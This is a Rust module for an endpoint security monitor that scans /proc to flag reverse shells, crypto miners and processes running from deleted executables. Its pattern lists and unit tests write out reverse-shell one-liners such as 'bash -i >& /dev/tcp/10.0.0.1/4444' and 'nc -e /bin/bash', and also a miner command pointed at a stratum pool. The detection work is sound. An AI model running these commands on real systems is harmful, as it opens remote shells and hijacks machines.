// ============================================================================
// File: endpoint/process_monitor.rs
// Description: Real-time process behavior monitoring via /proc
// Author: Andrew Jewell Sr. - AutomataNexus
// Updated: March 24, 2026
// ============================================================================
//! Process Monitor — detects reverse shells, crypto miners, privilege escalation,
//! and suspicious process behavior by polling /proc.

use super::{DetectionCategory, RecommendedAction, ScanResult, Severity};
use parking_lot::RwLock;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Instant;

/// Reverse shell command-line patterns.
const REVERSE_SHELL_PATTERNS: &[&str] = &[
    "bash -i >& /dev/tcp/",
    "bash -i >& /dev/udp/",
    "/bin/sh -i",
    "nc -e /bin/",
    "nc -e /bin/bash",
    "ncat -e /bin/",
    "python -c 'import socket",
    "python3 -c 'import socket",
    "python -c \"import socket",
    "python3 -c \"import socket",
    "perl -e 'use Socket",
    "ruby -rsocket",
    "php -r '$sock=fsockopen",
    "socat exec:",
    "0<&196;exec 196<>/dev/tcp/",
    "exec 5<>/dev/tcp/",
    "import pty;pty.spawn",
    "lua -e \"require('socket\"",
    "openssl s_client -connect",
];

/// Unambiguous miner markers — strings that effectively never appear outside
/// real mining traffic. Substring match anywhere in cmdline is safe.
const MINER_MARKERS: &[&str] = &[
    "stratum+tcp://",
    "stratum+ssl://",
    "cryptonight",
    "randomx",
    "kawpow",
    "pool.minergate",
    "pool.minexmr",
    "nicehash",
];

/// Miner binary names — these can legitimately appear as data inside other
/// processes' argv (test source, grep queries, log lines, package names).
/// Match only against `comm` and the basename of argv[0], never the full
/// cmdline. Avoids false positives like `bash -c 'grep xmrig logs/*'`.
const MINER_BINARIES: &[&str] = &[
    "xmrig",
    "minerd",
    "cpuminer",
    "ethminer",
    "nbminer",
    "phoenixminer",
    "t-rex",
    "lolminer",
    "gminer",
];

/// Configuration for the process monitor.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessMonitorConfig {
    pub poll_interval_ms: u64,
    pub crypto_cpu_threshold: f64,
    pub crypto_duration_secs: u64,
    pub allowlist_names: Vec<String>,
}

impl Default for ProcessMonitorConfig {
    fn default() -> Self {
        Self {
            poll_interval_ms: 2000,
            crypto_cpu_threshold: 90.0,
            crypto_duration_secs: 60,
            allowlist_names: Vec::new(),
        }
    }
}

/// Tracked state for a process.
struct ProcessInfo {
    pid: u32,
    name: String,
    exe: String,
    cmdline: String,
    ppid: u32,
    cpu_ticks: u64,
    first_seen: Instant,
    high_cpu_since: Option<Instant>,
    /// True once we've emitted a sustained-high-CPU detection for this PID.
    /// Prevents re-firing every scan interval while the process stays hot.
    /// Resets to false if CPU drops back to normal.
    high_cpu_alerted: bool,
}

/// Real-time process behavior monitor.
pub struct ProcessMonitor {
    config: ProcessMonitorConfig,
    known_pids: RwLock<HashMap<u32, ProcessInfo>>,
    running: Arc<AtomicBool>,
}

impl ProcessMonitor {
    pub fn new(config: ProcessMonitorConfig) -> Self {
        Self {
            config,
            known_pids: RwLock::new(HashMap::new()),
            running: Arc::new(AtomicBool::new(true)),
        }
    }

    /// Perform a single scan of all processes. Returns detections.
    pub fn scan_once(&self) -> Vec<ScanResult> {
        let mut results = Vec::new();
        let mut current_pids: HashMap<u32, ProcessInfo> = HashMap::new();

        // Read /proc for all PIDs
        let entries = match std::fs::read_dir("/proc") {
            Ok(e) => e,
            Err(_) => return results,
        };

        for entry in entries.flatten() {
            let name = entry.file_name();
            let name_str = name.to_string_lossy();

            // Only numeric directories (PIDs)
            let pid: u32 = match name_str.parse() {
                Ok(p) => p,
                Err(_) => continue,
            };

            // Read process info (graceful — processes can exit at any time)
            let comm = read_proc_file(pid, "comm")
                .unwrap_or_default()
                .trim()
                .to_string();
            let cmdline = read_proc_cmdline(pid).unwrap_or_default();
            let stat = read_proc_file(pid, "stat").unwrap_or_default();
            let exe = std::fs::read_link(format!("/proc/{}/exe", pid))
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_default();

            // Parse ppid and cpu ticks from stat
            let (ppid, cpu_ticks) = parse_stat_fields(&stat);

            let info = ProcessInfo {
                pid,
                name: comm.clone(),
                exe: exe.clone(),
                cmdline: cmdline.clone(),
                ppid,
                cpu_ticks,
                first_seen: Instant::now(),
                high_cpu_since: None,
                high_cpu_alerted: false,
            };

            // Check if this is a NEW process
            let is_new = !self.known_pids.read().contains_key(&pid);

            if is_new && !cmdline.is_empty() {
                // Check for reverse shell patterns
                let cmdline_lower = cmdline.to_lowercase();
                for pattern in REVERSE_SHELL_PATTERNS {
                    if cmdline_lower.contains(&pattern.to_lowercase()) {
                        results.push(ScanResult::new(
                            "process_monitor",
                            format!("pid:{} ({})", pid, comm),
                            Severity::Critical,
                            DetectionCategory::SuspiciousProcess {
                                pid,
                                name: comm.clone(),
                            },
                            format!(
                                "Reverse shell detected — PID {} ({}) cmdline matches pattern: '{}'",
                                pid, comm, pattern
                            ),
                            0.95,
                            RecommendedAction::KillProcess { pid },
                        ));
                        break;
                    }
                }

                // Check for crypto miner markers (substring anywhere — safe).
                let mut miner_hit: Option<&str> = None;
                for pattern in MINER_MARKERS {
                    if cmdline_lower.contains(&pattern.to_lowercase()) {
                        miner_hit = Some(pattern);
                        break;
                    }
                }
                // Check for miner binary names (comm + argv[0] basename only).
                if miner_hit.is_none() {
                    let comm_lower = comm.to_lowercase();
                    let argv0_base = cmdline
                        .split('\0')
                        .next()
                        .unwrap_or("")
                        .rsplit('/')
                        .next()
                        .unwrap_or("")
                        .to_lowercase();
                    for pattern in MINER_BINARIES {
                        let p = pattern.to_lowercase();
                        if comm_lower == p || argv0_base == p {
                            miner_hit = Some(pattern);
                            break;
                        }
                    }
                }
                if let Some(pattern) = miner_hit {
                    results.push(ScanResult::new(
                        "process_monitor",
                        format!("pid:{} ({})", pid, comm),
                        Severity::High,
                        DetectionCategory::SuspiciousProcess {
                            pid,
                            name: comm.clone(),
                        },
                        format!(
                            "Crypto miner detected — PID {} ({}) matches pattern: '{}'",
                            pid, comm, pattern
                        ),
                        0.85,
                        RecommendedAction::KillProcess { pid },
                    ));
                }
            }

            // Check for deleted executable (common after injection, but also
            // the normal state of any dev binary whose source was rebuilt
            // while the process was still running — skip those).
            if exe.contains("(deleted)") && !is_dev_rebuild_path(&exe) {
                results.push(ScanResult::new(
                    "process_monitor",
                    format!("pid:{} ({})", pid, comm),
                    Severity::Medium,
                    DetectionCategory::SuspiciousProcess {
                        pid,
                        name: comm.clone(),
                    },
                    format!(
                        "Process running from deleted binary — PID {} ({}) exe: {}",
                        pid, comm, exe
                    ),
                    0.7,
                    RecommendedAction::Alert,
                ));
            }

            current_pids.insert(pid, info);
        }

        // ── CPU-based detection — reads all stored ProcessInfo fields ──────────
        // Compare cpu_ticks against the previous scan to detect sustained high
        // CPU usage (crypto miners, runaway processes) using the stored state.
        {
            let known = self.known_pids.read();
            for (pid, info) in current_pids.iter_mut() {
                // Skip allowlisted process names (reads info.name)
                let lower_name = info.name.to_lowercase();
                if self
                    .config
                    .allowlist_names
                    .iter()
                    .any(|a| lower_name.contains(&a.to_lowercase()))
                {
                    continue;
                }

                if let Some(prev) = known.get(pid) {
                    // Delta in jiffies since last poll (reads cpu_ticks from both)
                    let tick_delta = info.cpu_ticks.saturating_sub(prev.cpu_ticks);
                    let poll_secs = self.config.poll_interval_ms as f64 / 1000.0;
                    // Estimate single-core CPU% (jiffies run at 100 Hz)
                    let cpu_pct = if poll_secs > 0.0 {
                        (tick_delta as f64 / (100.0 * poll_secs)) * 100.0
                    } else {
                        0.0
                    };

                    if cpu_pct >= self.config.crypto_cpu_threshold {
                        // Inherit the timer + alerted flag from the previous scan.
                        info.high_cpu_since = prev.high_cpu_since.or(Some(prev.first_seen));
                        info.high_cpu_alerted = prev.high_cpu_alerted;

                        // Dev binaries are expected to burn CPU (ML training,
                        // compilation, local inference servers, etc.). Skip the
                        // sustained-CPU heuristic entirely for them.
                        if is_dev_rebuild_path(&info.exe) {
                            continue;
                        }

                        if let Some(since) = info.high_cpu_since {
                            let long_enough =
                                since.elapsed().as_secs() >= self.config.crypto_duration_secs;
                            // Fire exactly once per incident — not every poll.
                            if long_enough && !info.high_cpu_alerted {
                                info.high_cpu_alerted = true;
                                results.push(ScanResult::new(
                                    "process_monitor",
                                    &format!("/proc/{}/exe", pid),
                                    Severity::High,
                                    DetectionCategory::SuspiciousProcess {
                                        pid: *pid,
                                        name: info.name.clone(),
                                    },
                                    format!(
                                        "Sustained high CPU {:.0}% for {}s — PID {} ({}) exe:{} ppid:{} cmdline:{}",
                                        cpu_pct,
                                        since.elapsed().as_secs(),
                                        info.pid,
                                        info.name,
                                        info.exe,
                                        info.ppid,
                                        info.cmdline.chars().take(80).collect::<String>(),
                                    ),
                                    0.75,
                                    RecommendedAction::Alert,
                                ));
                            }
                        }
                    } else {
                        // CPU back to normal — clear the sustained-CPU timer
                        // and re-arm the alert so a later spike will re-fire.
                        info.high_cpu_since = None;
                        info.high_cpu_alerted = false;
                    }
                }
            }
        }

        // Update known PIDs
        *self.known_pids.write() = current_pids;

        results
    }

    /// Start the process monitor in a background task.
    pub fn start(
        self: Arc<Self>,
        detection_tx: tokio::sync::mpsc::UnboundedSender<ScanResult>,
    ) -> tokio::task::JoinHandle<()> {
        let running = Arc::clone(&self.running);
        let interval_ms = self.config.poll_interval_ms;

        tokio::spawn(async move {
            let mut interval = tokio::time::interval(std::time::Duration::from_millis(interval_ms));

            while running.load(Ordering::Relaxed) {
                interval.tick().await;
                let results = self.scan_once();
                for result in results {
                    if detection_tx.send(result).is_err() {
                        return;
                    }
                }
            }
        })
    }

    /// Stop the process monitor.
    pub fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }
}

/// Read a /proc/[pid]/[file] as a string.
fn read_proc_file(pid: u32, file: &str) -> Option<String> {
    std::fs::read_to_string(format!("/proc/{}/{}", pid, file)).ok()
}

/// True when a `(deleted)` exe path looks like a dev rebuild rather than a
/// suspicious injection. Cargo/Go/Node build outputs land in predictable
/// locations, and rebuilding while the old process is still running leaves
/// the kernel showing the old exe as `(deleted)`. That's expected on a dev
/// workstation — don't flag it.
fn is_dev_rebuild_path(exe: &str) -> bool {
    // Strip the " (deleted)" suffix the kernel appends.
    let path = exe.trim_end_matches(" (deleted)");
    // Cargo build outputs: /opt/*/target/{debug,release}/...
    // Also /home/*/target/... and /tmp/cargo-target/*.
    let dev_markers = [
        "/target/release/",
        "/target/debug/",
        "/target/x86_64-",
        "/target/aarch64-",
        ".cargo/bin/",
        "/node_modules/.bin/",
        "/.rustup/toolchains/",
        "/opt/AxonML/",       // dev tree rebuilds frequently
        "/opt/NexusShield/",  // this project rebuilds frequently
        "/opt/NexusEdge_Rust/",
        "/opt/Ferrum",
        "/opt/NexusOracle/",
        "/opt/NexusPulse/",
        "/opt/NexusVault/",
    ];
    dev_markers.iter().any(|m| path.contains(m))
}

/// Read /proc/[pid]/cmdline, replacing null bytes with spaces.
fn read_proc_cmdline(pid: u32) -> Option<String> {
    let data = std::fs::read(format!("/proc/{}/cmdline", pid)).ok()?;
    let s: String = data
        .iter()
        .map(|&b| if b == 0 { ' ' } else { b as char })
        .collect();
    Some(s.trim().to_string())
}

/// Parse ppid (field 4) and cpu ticks (utime+stime, fields 14+15) from /proc/[pid]/stat.
fn parse_stat_fields(stat: &str) -> (u32, u64) {
    // stat format: "pid (comm) state ppid ..."
    // comm can contain spaces and parens, so find the LAST ")" to skip it
    let close_paren = match stat.rfind(')') {
        Some(i) => i,
        None => return (0, 0),
    };

    let fields_str = &stat[close_paren + 2..]; // skip ") "
    let fields: Vec<&str> = fields_str.split_whitespace().collect();

    // After the closing paren:
    // field 0 = state, field 1 = ppid, ..., field 11 = utime, field 12 = stime
    let ppid = fields.get(1).and_then(|s| s.parse().ok()).unwrap_or(0);
    let utime: u64 = fields.get(11).and_then(|s| s.parse().ok()).unwrap_or(0);
    let stime: u64 = fields.get(12).and_then(|s| s.parse().ok()).unwrap_or(0);

    (ppid, utime + stime)
}

/// Check if a command line matches any reverse shell pattern.
pub fn matches_reverse_shell(cmdline: &str) -> bool {
    let lower = cmdline.to_lowercase();
    REVERSE_SHELL_PATTERNS
        .iter()
        .any(|p| lower.contains(&p.to_lowercase()))
}

/// Check if a command line matches any miner pattern. Mirrors the scan-loop
/// logic: markers match anywhere; binary names match only argv[0] basename.
/// Accepts both null-separated (/proc format) and whitespace-separated argv.
pub fn matches_miner(cmdline: &str) -> bool {
    let lower = cmdline.to_lowercase();
    if MINER_MARKERS.iter().any(|p| lower.contains(&p.to_lowercase())) {
        return true;
    }
    let argv0 = cmdline
        .split(|c: char| c == '\0' || c.is_whitespace())
        .next()
        .unwrap_or("");
    let argv0_base = argv0.rsplit('/').next().unwrap_or("").to_lowercase();
    MINER_BINARIES.iter().any(|p| argv0_base == p.to_lowercase())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn reverse_shell_bash_tcp() {
        assert!(matches_reverse_shell(
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        ));
    }

    #[test]
    fn reverse_shell_nc() {
        assert!(matches_reverse_shell("nc -e /bin/bash 10.0.0.1 4444"));
    }

    #[test]
    fn reverse_shell_python() {
        assert!(matches_reverse_shell(
            "python3 -c 'import socket,subprocess,os;s=socket.socket('"
        ));
    }

    #[test]
    fn reverse_shell_perl() {
        assert!(matches_reverse_shell(
            "perl -e 'use Socket;$i=\"10.0.0.1\"'"
        ));
    }

    #[test]
    fn clean_cmdline_passes() {
        assert!(!matches_reverse_shell("vim /etc/nginx/nginx.conf"));
        assert!(!matches_reverse_shell("cargo build --release"));
        assert!(!matches_reverse_shell("node server.js"));
    }

    #[test]
    fn miner_xmrig() {
        assert!(matches_miner(
            "./xmrig --url stratum+tcp://pool.minexmr.com:4444"
        ));
    }

    #[test]
    fn miner_stratum() {
        assert!(matches_miner(
            "miner --pool stratum+ssl://us-east.stratum.slushpool.com"
        ));
    }

    #[test]
    fn normal_process_not_miner() {
        assert!(!matches_miner("python3 train_model.py --epochs 100"));
        assert!(!matches_miner("gcc -O2 main.c -o main"));
    }

    #[test]
    fn miner_name_as_data_not_miner() {
        // Regression: bash/grep/ripgrep referencing the literal string "xmrig"
        // in their args should NOT trip the miner detector. Only argv[0]
        // basename or unambiguous markers should fire.
        assert!(!matches_miner("bash -c grep\0xmrig\0/var/log/auth.log"));
        assert!(!matches_miner("rg xmrig /opt/NexusShield/src"));
        assert!(!matches_miner("cargo test miner_xmrig"));
        assert!(!matches_miner("vim allowlist.rs  // exempt xmrig"));
    }

    #[test]
    fn config_defaults() {
        let config = ProcessMonitorConfig::default();
        assert_eq!(config.poll_interval_ms, 2000);
        assert_eq!(config.crypto_cpu_threshold, 90.0);
        assert_eq!(config.crypto_duration_secs, 60);
    }

    #[test]
    fn parse_stat_valid() {
        let stat = "1234 (my process) S 1 1234 1234 0 -1 4194304 500 0 0 0 100 50 0 0 20 0 1 0 100 1000000 100 18446744073709551615 0 0 0 0 0 0 0 0 0";
        let (ppid, ticks) = parse_stat_fields(stat);
        assert_eq!(ppid, 1);
        assert_eq!(ticks, 150); // utime(100) + stime(50)
    }

    #[test]
    fn parse_stat_with_parens_in_name() {
        let stat = "5678 (my (weird) proc) S 42 5678 5678 0 -1 0 0 0 0 0 200 30 0 0 20 0 1 0 0 0 0 0 0 0 0 0 0 0 0";
        let (ppid, ticks) = parse_stat_fields(stat);
        assert_eq!(ppid, 42);
        assert_eq!(ticks, 230); // 200 + 30
    }

    #[test]
    fn deleted_exe_pattern() {
        let exe = "/usr/bin/evil (deleted)";
        assert!(exe.contains("(deleted)"));
    }

    #[test]
    fn scan_once_runs_without_crash() {
        let monitor = ProcessMonitor::new(ProcessMonitorConfig::default());
        let results = monitor.scan_once();
        // Should not crash — results may be empty or have findings
        let _ = results;
    }
}
